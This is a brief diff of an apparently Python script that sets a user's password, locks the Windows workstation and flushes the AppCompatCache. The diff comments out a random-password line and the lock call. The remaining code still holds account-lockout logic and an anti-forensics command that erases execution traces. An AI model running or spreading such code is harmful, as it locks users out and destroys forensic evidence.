@@ -46,13 +46,13 @@ subprocess.call(cmd)
 # Set random password
 u = "Jonathan"
 p = "P@ssw0rd"
-p = ''.join(random.choice(string.printable) for i in range(16))
+#p = ''.join(random.choice(string.printable) for i in range(16))
 set_password(u, p)
 if verify_success(u, p):
 
     # Screenlock activated
     cmd = "rundll32.exe user32.dll, LockWorkStation"
-    subprocess.call(cmd)
+    #subprocess.call(cmd)
 
     # Flush AppCompatCache
     cmd = "rundll32.exe kernel32.dll, BaseFlushAppcompatCache"
